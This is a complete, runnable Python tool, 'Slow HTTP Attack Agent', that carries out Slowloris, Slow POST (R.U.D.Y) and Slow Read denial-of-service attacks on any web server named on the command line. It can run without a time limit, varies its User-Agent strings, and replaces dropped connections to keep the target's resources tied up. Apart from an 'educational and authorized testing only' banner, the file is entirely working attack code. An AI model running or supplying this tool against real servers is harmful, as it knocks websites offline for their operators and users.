#!/usr/bin/env python3
"""
Slow HTTP Attack Agent - Enhanced Version
Purpose: Educational and Authorized Penetration Testing Only

⚠️  WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️
Unauthorized use against systems you don't own is ILLEGAL!
"""

import socket
import threading
import time
import sys
import random
import string
import signal
import argparse
import logging
from urllib.parse import urlparse
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
import json

# Try to import optional dependencies
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


@dataclass
class AttackStats:
    """Thread-safe attack statistics"""
    connections_active: int = 0
    packets_sent: int = 0
    bytes_sent: int = 0
    error_count: int = 0
    
    def to_dict(self) -> Dict:
        return {
            'connections_active': self.connections_active,
            'packets_sent': self.packets_sent,
            'bytes_sent': self.bytes_sent,
            'error_count': self.error_count
        }


class ThreadSafeStats:
    """Thread-safe statistics manager"""
    
    def __init__(self):
        self.stats = AttackStats()
        self._lock = threading.Lock()
    
    def increment(self, key: str, value: int = 1):
        """Increment a stat value"""
        with self._lock:
            current = getattr(self.stats, key)
            setattr(self.stats, key, current + value)
    
    def decrement(self, key: str, value: int = 1):
        """Decrement a stat value"""
        with self._lock:
            current = getattr(self.stats, key)
            setattr(self.stats, key, max(0, current - value))
    
    def set(self, key: str, value: int):
        """Set a stat value"""
        with self._lock:
            setattr(self.stats, key, value)
    
    def get(self, key: str) -> int:
        """Get a stat value"""
        with self._lock:
            return getattr(self.stats, key)
    
    def get_all(self) -> Dict:
        """Get all stats"""
        with self._lock:
            return self.stats.to_dict()


class MemoryMonitor:
    """Monitor and manage memory usage"""
    
    def __init__(self, max_memory_mb: int = 512):
        self.max_memory_mb = max_memory_mb
        self.enabled = PSUTIL_AVAILABLE
    
    def get_memory_usage(self) -> float:
        """Get current memory usage in MB"""
        if not self.enabled:
            return 0.0
        
        try:
            process = psutil.Process()
            return process.memory_info().rss / 1024 / 1024
        except Exception:
            return 0.0
    
    def is_memory_limit_reached(self) -> bool:
        """Check if memory limit is reached"""
        if not self.enabled:
            return False
        
        return self.get_memory_usage() > self.max_memory_mb
    
    def get_memory_percentage(self) -> float:
        """Get memory usage as percentage of limit"""
        if not self.enabled:
            return 0.0
        
        return (self.get_memory_usage() / self.max_memory_mb) * 100


class RateLimiter:
    """Rate limiter to prevent overwhelming the system"""
    
    def __init__(self, max_rate: int = 1000, window: int = 1):
        """
        Initialize rate limiter.
        
        Args:
            max_rate: Maximum operations per window
            window: Time window in seconds
        """
        self.max_rate = max_rate
        self.window = window
        self.operations = []
        self._lock = threading.Lock()
    
    def can_proceed(self) -> bool:
        """Check if operation can proceed"""
        with self._lock:
            current_time = time.time()
            
            # Remove old operations outside window
            self.operations = [
                op_time for op_time in self.operations
                if current_time - op_time < self.window
            ]
            
            # Check if under limit
            if len(self.operations) < self.max_rate:
                self.operations.append(current_time)
                return True
            
            return False
    
    def wait_if_needed(self):
        """Wait if rate limit is reached"""
        while not self.can_proceed():
            time.sleep(0.01)


class SlowHTTPAttack:
    """Enhanced Slow HTTP Attack with proper resource management"""
    
    def __init__(
        self,
        host: str,
        port: int = 80,
        use_ssl: bool = False,
        max_memory_mb: int = 512
    ):
        """
        Initialize attack instance.
        
        Args:
            host: Target host
            port: Target port
            use_ssl: Use SSL/TLS
            max_memory_mb: Maximum memory usage in MB
        """
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        
        # Connection management
        self.conns: List[socket.socket] = []
        self.running = False
        self.lock = threading.Lock()
        
        # Statistics
        self.stats = ThreadSafeStats()
        
        # Memory monitoring
        self.memory_monitor = MemoryMonitor(max_memory_mb)
        
        # Rate limiting
        self.rate_limiter = RateLimiter(max_rate=1000, window=1)
        
        # User agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0"
        ]
        
        logger.info(f"Initialized attack on {host}:{port} (SSL: {use_ssl})")
    
    def create_socket(self) -> Optional[socket.socket]:
        """Create and connect socket"""
        try:
            # Check memory before creating socket
            if self.memory_monitor.is_memory_limit_reached():
                logger.warning("Memory limit reached, not creating new socket")
                return None
            
            # Rate limit socket creation
            self.rate_limiter.wait_if_needed()
            
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)
            
            # Connect
            sock.connect((self.host, self.port))
            
            # Wrap with SSL if needed
            if self.use_ssl:
                import ssl
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.host)
            
            return sock
            
        except socket.timeout:
            logger.debug("Socket connection timeout")
            self.stats.increment('error_count')
            return None
        except socket.error as e:
            logger.debug(f"Socket error: {e}")
            self.stats.increment('error_count')
            return None
        except Exception as e:
            logger.error(f"Unexpected error creating socket: {e}")
            self.stats.increment('error_count')
            return None
    
    def close_socket(self, sock: socket.socket):
        """Safely close socket"""
        try:
            sock.close()
        except Exception:
            pass
    
    def cleanup_dead_connections(self):
        """Remove dead connections from list"""
        with self.lock:
            alive_conns = []
            
            for sock in self.conns:
                try:
                    # Try to send empty data to check if alive
                    sock.send(b'')
                    alive_conns.append(sock)
                except Exception:
                    # Connection dead, close it
                    self.close_socket(sock)
                    self.stats.decrement('connections_active')
            
            self.conns = alive_conns
    
    def reduce_connections(self, percentage: float = 0.25):
        """Reduce number of connections by percentage"""
        with self.lock:
            num_to_close = int(len(self.conns) * percentage)
            
            for _ in range(num_to_close):
                if self.conns:
                    sock = self.conns.pop(0)
                    self.close_socket(sock)
                    self.stats.decrement('connections_active')
            
            logger.info(f"Reduced connections by {percentage*100}% ({num_to_close} closed)")
    
    def slowloris_attack(
        self,
        num_conns: int = 100,
        delay: int = 15,
        duration: int = 0
    ):
        """
        Slowloris attack implementation.
        
        Args:
            num_conns: Number of connections
            delay: Delay between packets
            duration: Attack duration (0 = unlimited)
        """
        logger.info(f"[SLOWLORIS] Starting attack on {self.host}:{self.port}")
        logger.info(f"[CONFIG] Connections: {num_conns}, Delay: {delay}s, Duration: {duration}s")
        
        self.running = True
        start_time = time.time()
        
        # Setup signal handler
        def signal_handler(sig, frame):
            logger.info("Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        try:
            # Phase 1: Create initial connections
            logger.info("[PHASE1] Creating initial connections...")
            
            for i in range(num_conns):
                if not self.running:
                    break
                
                # Check memory
                if self.memory_monitor.is_memory_limit_reached():
                    logger.warning("Memory limit reached, reducing connections")
                    self.reduce_connections(0.25)
                
                sock = self.create_socket()
                if sock:
                    try:
                        # Send incomplete HTTP request
                        request = self._build_slowloris_request()
                        sock.send(request.encode())
                        
                        with self.lock:
                            self.conns.append(sock)
                        
                        self.stats.increment('connections_active')
                        self.stats.increment('packets_sent')
                        self.stats.increment('bytes_sent', len(request))
                        
                        if (i + 1) % 100 == 0:
                            logger.info(f"[PROGRESS] {i+1}/{num_conns} connections created")
                    
                    except Exception as e:
                        logger.debug(f"Error sending initial request: {e}")
                        self.close_socket(sock)
                        self.stats.increment('error_count')
                
                # Small delay every 100 connections
                if i % 100 == 0:
                    time.sleep(0.1)
            
            logger.info(f"[PHASE1] Complete. Active connections: {len(self.conns)}")
            
            if not self.conns:
                logger.error("No connections established, aborting attack")
                return
            
            # Phase 2: Keep connections alive
            logger.info("[PHASE2] Starting keep-alive phase...")
            cycle_count = 0
            
            while self.running:
                # Check duration
                if duration > 0 and (time.time() - start_time) >= duration:
                    logger.info("Duration limit reached, stopping attack")
                    break
                
                cycle_count += 1
                
                # Check memory and cleanup if needed
                if self.memory_monitor.is_memory_limit_reached():
                    logger.warning("Memory limit reached, cleaning up")
                    self.cleanup_dead_connections()
                    self.reduce_connections(0.25)
                
                # Send keep-alive headers
                failed_socks = []
                
                with self.lock:
                    conns_copy = self.conns.copy()
                
                for sock in conns_copy:
                    if not self.running:
                        break
                    
                    try:
                        # Send partial header
                        header = self._build_partial_header()
                        sock.send(header.encode())
                        
                        self.stats.increment('packets_sent')
                        self.stats.increment('bytes_sent', len(header))
                    
                    except Exception:
                        failed_socks.append(sock)
                        self.stats.increment('error_count')
                
                # Replace failed connections
                for sock in failed_socks:
                    with self.lock:
                        if sock in self.conns:
                            self.conns.remove(sock)
                    
                    self.close_socket(sock)
                    self.stats.decrement('connections_active')
                    
                    # Try to create replacement
                    new_sock = self.create_socket()
                    if new_sock:
                        try:
                            request = self._build_slowloris_request()
                            new_sock.send(request.encode())
                            
                            with self.lock:
                                self.conns.append(new_sock)
                            
                            self.stats.increment('connections_active')
                            self.stats.increment('packets_sent')
                            self.stats.increment('bytes_sent', len(request))
                        except Exception:
                            self.close_socket(new_sock)
                
                # Print status
                stats = self.stats.get_all()
                memory_pct = self.memory_monitor.get_memory_percentage()
                
                logger.info(
                    f"[CYCLE {cycle_count}] Active: {stats['connections_active']} | "
                    f"Packets: {stats['packets_sent']} | "
                    f"Errors: {stats['error_count']} | "
                    f"Memory: {memory_pct:.1f}%"
                )
                
                # Sleep before next cycle
                time.sleep(delay)
        
        finally:
            self.stop_attack()
            logger.info("[COMPLETE] Attack finished")
    
    def slow_post_attack(
        self,
        num_conns: int = 50,
        delay: int = 10,
        duration: int = 0
    ):
        """
        Slow POST (R.U.D.Y) attack implementation.
        
        Args:
            num_conns: Number of connections
            delay: Delay between packets
            duration: Attack duration (0 = unlimited)
        """
        logger.info(f"[R.U.D.Y] Starting Slow POST attack on {self.host}:{self.port}")
        logger.info(f"[CONFIG] Connections: {num_conns}, Delay: {delay}s, Duration: {duration}s")
        
        self.running = True
        start_time = time.time()
        
        # Setup signal handler
        def signal_handler(sig, frame):
            logger.info("Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        try:
            # Create initial connections with POST headers
            logger.info("[PHASE1] Creating POST connections...")
            
            content_length = random.randint(10000000, 100000000)
            
            for i in range(num_conns):
                if not self.running:
                    break
                
                # Check memory
                if self.memory_monitor.is_memory_limit_reached():
                    logger.warning("Memory limit reached, reducing connections")
                    self.reduce_connections(0.25)
                
                sock = self.create_socket()
                if sock:
                    try:
                        # Send POST request with large content-length
                        request = self._build_slow_post_request(content_length)
                        sock.send(request.encode())
                        
                        with self.lock:
                            self.conns.append(sock)
                        
                        self.stats.increment('connections_active')
                        self.stats.increment('packets_sent')
                        self.stats.increment('bytes_sent', len(request))
                        
                        if (i + 1) % 50 == 0:
                            logger.info(f"[PROGRESS] {i+1}/{num_conns} connections created")
                    
                    except Exception as e:
                        logger.debug(f"Error sending POST request: {e}")
                        self.close_socket(sock)
                        self.stats.increment('error_count')
                
                if i % 50 == 0:
                    time.sleep(0.1)
            
            logger.info(f"[PHASE1] Complete. Active connections: {len(self.conns)}")
            
            if not self.conns:
                logger.error("No connections established, aborting attack")
                return
            
            # Phase 2: Send data slowly
            logger.info("[PHASE2] Sending POST data slowly...")
            cycle_count = 0
            
            while self.running:
                # Check duration
                if duration > 0 and (time.time() - start_time) >= duration:
                    logger.info("Duration limit reached, stopping attack")
                    break
                
                cycle_count += 1
                
                # Check memory
                if self.memory_monitor.is_memory_limit_reached():
                    logger.warning("Memory limit reached, cleaning up")
                    self.cleanup_dead_connections()
                    self.reduce_connections(0.25)
                
                # Send small data chunks
                failed_socks = []
                
                with self.lock:
                    conns_copy = self.conns.copy()
                
                for sock in conns_copy:
                    if not self.running:
                        break
                    
                    try:
                        # Send tiny data chunk
                        data_chunk = random.choice(string.ascii_lowercase) + "="
                        sock.send(data_chunk.encode())
                        
                        self.stats.increment('packets_sent')
                        self.stats.increment('bytes_sent', len(data_chunk))
                    
                    except Exception:
                        failed_socks.append(sock)
                        self.stats.increment('error_count')
                
                # Replace failed connections
                for sock in failed_socks:
                    with self.lock:
                        if sock in self.conns:
                            self.conns.remove(sock)
                    
                    self.close_socket(sock)
                    self.stats.decrement('connections_active')
                    
                    # Try to create replacement
                    new_sock = self.create_socket()
                    if new_sock:
                        try:
                            request = self._build_slow_post_request(content_length)
                            new_sock.send(request.encode())
                            
                            with self.lock:
                                self.conns.append(new_sock)
                            
                            self.stats.increment('connections_active')
                            self.stats.increment('packets_sent')
                            self.stats.increment('bytes_sent', len(request))
                        except Exception:
                            self.close_socket(new_sock)
                
                # Print status
                stats = self.stats.get_all()
                memory_pct = self.memory_monitor.get_memory_percentage()
                
                logger.info(
                    f"[CYCLE {cycle_count}] Active: {stats['connections_active']} | "
                    f"Packets: {stats['packets_sent']} | "
                    f"Errors: {stats['error_count']} | "
                    f"Memory: {memory_pct:.1f}%"
                )
                
                # Sleep before next cycle
                time.sleep(delay)
        
        finally:
            self.stop_attack()
            logger.info("[COMPLETE] Attack finished")
    
    def slow_read_attack(
        self,
        num_conns: int = 50,
        delay: int = 10,
        duration: int = 0
    ):
        """
        Slow Read attack implementation.
        
        Args:
            num_conns: Number of connections
            delay: Delay between reads
            duration: Attack duration (0 = unlimited)
        """
        logger.info(f"[SLOW-READ] Starting attack on {self.host}:{self.port}")
        logger.info(f"[CONFIG] Connections: {num_conns}, Delay: {delay}s, Duration: {duration}s")
        
        self.running = True
        start_time = time.time()
        
        # Setup signal handler
        def signal_handler(sig, frame):
            logger.info("Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        try:
            # Create initial connections
            logger.info("[PHASE1] Creating connections with small receive buffer...")
            
            for i in range(num_conns):
                if not self.running:
                    break
                
                # Check memory
                if self.memory_monitor.is_memory_limit_reached():
                    logger.warning("Memory limit reached, reducing connections")
                    self.reduce_connections(0.25)
                
                sock = self.create_socket()
                if sock:
                    try:
                        # Set small receive buffer
                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
                        
                        # Send complete request
                        request = self._build_complete_request()
                        sock.send(request.encode())
                        
                        with self.lock:
                            self.conns.append(sock)
                        
                        self.stats.increment('connections_active')
                        self.stats.increment('packets_sent')
                        self.stats.increment('bytes_sent', len(request))
                        
                        if (i + 1) % 50 == 0:
                            logger.info(f"[PROGRESS] {i+1}/{num_conns} connections created")
                    
                    except Exception as e:
                        logger.debug(f"Error creating slow-read connection: {e}")
                        self.close_socket(sock)
                        self.stats.increment('error_count')
                
                if i % 50 == 0:
                    time.sleep(0.1)
            
            logger.info(f"[PHASE1] Complete. Active connections: {len(self.conns)}")
            
            if not self.conns:
                logger.error("No connections established, aborting attack")
                return
            
            # Phase 2: Read data slowly
            logger.info("[PHASE2] Reading data slowly...")
            cycle_count = 0
            
            while self.running:
                # Check duration
                if duration > 0 and (time.time() - start_time) >= duration:
                    logger.info("Duration limit reached, stopping attack")
                    break
                
                cycle_count += 1
                
                # Check memory
                if self.memory_monitor.is_memory_limit_reached():
                    logger.warning("Memory limit reached, cleaning up")
                    self.cleanup_dead_connections()
                    self.reduce_connections(0.25)
                
                # Read tiny amounts of data
                failed_socks = []
                
                with self.lock:
                    conns_copy = self.conns.copy()
                
                for sock in conns_copy:
                    if not self.running:
                        break
                    
                    try:
                        # Read 1 byte
                        sock.recv(1)
                    except socket.timeout:
                        # Timeout is expected and good
                        pass
                    except Exception:
                        failed_socks.append(sock)
                        self.stats.increment('error_count')
                
                # Replace failed connections
                for sock in failed_socks:
                    with self.lock:
                        if sock in self.conns:
                            self.conns.remove(sock)
                    
                    self.close_socket(sock)
                    self.stats.decrement('connections_active')
                    
                    # Try to create replacement
                    new_sock = self.create_socket()
                    if new_sock:
                        try:
                            new_sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
                            request = self._build_complete_request()
                            new_sock.send(request.encode())
                            
                            with self.lock:
                                self.conns.append(new_sock)
                            
                            self.stats.increment('connections_active')
                            self.stats.increment('packets_sent')
                            self.stats.increment('bytes_sent', len(request))
                        except Exception:
                            self.close_socket(new_sock)
                
                # Print status
                stats = self.stats.get_all()
                memory_pct = self.memory_monitor.get_memory_percentage()
                
                logger.info(
                    f"[CYCLE {cycle_count}] Active: {stats['connections_active']} | "
                    f"Packets: {stats['packets_sent']} | "
                    f"Errors: {stats['error_count']} | "
                    f"Memory: {memory_pct:.1f}%"
                )
                
                # Sleep before next cycle
                time.sleep(delay)
        
        finally:
            self.stop_attack()
            logger.info("[COMPLETE] Attack finished")
    
    def _build_slowloris_request(self) -> str:
        """Build incomplete HTTP request for Slowloris"""
        request = f"GET /?{random.randint(1000, 9999)} HTTP/1.1\r\n"
        request += f"Host: {self.host}\r\n"
        request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
        request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        request += "Accept-Language: en-US,en;q=0.5\r\n"
        request += "Accept-Encoding: gzip, deflate\r\n"
        request += "Connection: keep-alive\r\n"
        request += "Cache-Control: no-cache\r\n"
        return request
    
    def _build_partial_header(self) -> str:
        """Build partial header for keep-alive"""
        header_name = ''.join(random.choices(string.ascii_letters, k=random.randint(10, 20)))
        header_value = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(20, 50)))
        return f"X-{header_name}: {header_value}\r\n"
    
    def _build_slow_post_request(self, content_length: int) -> str:
        """Build POST request with large content-length"""
        request = f"POST /?{random.randint(1000, 9999)} HTTP/1.1\r\n"
        request += f"Host: {self.host}\r\n"
        request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
        request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        request += "Accept-Language: en-US,en;q=0.5\r\n"
        request += "Accept-Encoding: gzip, deflate\r\n"
        request += "Connection: keep-alive\r\n"
        request += "Content-Type: application/x-www-form-urlencoded\r\n"
        request += f"Content-Length: {content_length}\r\n"
        request += "\r\n"
        return request
    
    def _build_complete_request(self) -> str:
        """Build complete HTTP request"""
        request = f"GET /?{random.randint(1000, 9999)} HTTP/1.1\r\n"
        request += f"Host: {self.host}\r\n"
        request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
        request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        request += "Accept-Language: en-US,en;q=0.5\r\n"
        request += "Accept-Encoding: gzip, deflate\r\n"
        request += "Connection: keep-alive\r\n"
        request += "X-Requested-With: XMLHttpRequest\r\n"
        request += "\r\n"
        return request
    
    def stop_attack(self):
        """Stop attack and cleanup"""
        self.running = False
        
        # Close all connections
        with self.lock:
            for sock in self.conns:
                self.close_socket(sock)
            self.conns.clear()
        
        self.stats.set('connections_active', 0)
        
        # Print final stats
        final_stats = self.stats.get_all()
        logger.info(f"[FINAL STATS] {json.dumps(final_stats, indent=2)}")


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="Slow HTTP Attack Agent - Enhanced Version",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --target example.com --attack slowloris
  %(prog)s --target https://example.com --attack slow_post --connections 50
  %(prog)s --target example.com --port 8080 --attack slow_read --duration 300

⚠️  WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY!
        """
    )
    
    parser.add_argument('--target', required=True, help='Target hostname or URL')
    parser.add_argument('--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('--ssl', action='store_true', help='Use SSL/TLS')
    parser.add_argument(
        '--attack',
        choices=['slowloris', 'slow_post', 'slow_read'],
        default='slowloris',
        help='Attack type (default: slowloris)'
    )
    parser.add_argument('--connections', type=int, default=100, help='Number of connections (default: 100)')
    parser.add_argument('--delay', type=int, default=15, help='Delay between packets in seconds (default: 15)')
    parser.add_argument('--duration', type=int, default=0, help='Attack duration in seconds (0 = unlimited)')
    parser.add_argument('--max-memory', type=int, default=512, help='Maximum memory usage in MB (default: 512)')
    parser.add_argument('--version', action='version', version='%(prog)s 2.0')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')
    
    args = parser.parse_args()
    
    # Set logging level
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Parse target
    if args.target.startswith(('http://', 'https://')):
        parsed = urlparse(args.target)
        target_host = parsed.netloc
        use_ssl = parsed.scheme == 'https'
        port = parsed.port or (443 if use_ssl else 80)
    else:
        target_host = args.target
        use_ssl = args.ssl
        port = args.port
    
    # Display warning
    print("\n" + "="*70)
    print("⚠️  WARNING: EDUCATIONAL AND AUTHORIZED TESTING ONLY!")
    print("="*70)
    print(f"Target: {target_host}:{port}")
    print(f"Attack: {args.attack}")
    print(f"Connections: {args.connections}")
    print(f"Duration: {'unlimited' if args.duration == 0 else f'{args.duration}s'}")
    print("="*70 + "\n")
    
    # Create attacker
    attacker = SlowHTTPAttack(
        target_host,
        port,
        use_ssl,
        args.max_memory
    )
    
    try:
        # Launch attack
        if args.attack == 'slowloris':
            attacker.slowloris_attack(args.connections, args.delay, args.duration)
        elif args.attack == 'slow_post':
            attacker.slow_post_attack(args.connections, args.delay, args.duration)
        elif args.attack == 'slow_read':
            attacker.slow_read_attack(args.connections, args.delay, args.duration)
    
    except KeyboardInterrupt:
        print("\n[INTERRUPTED] Stopping attack...")
        attacker.stop_attack()
    except Exception as e:
        logger.error(f"[ERROR] {e}")
        attacker.stop_attack()
    finally:
        print("[CLEANUP] Attack completed")


if __name__ == "__main__":
    main()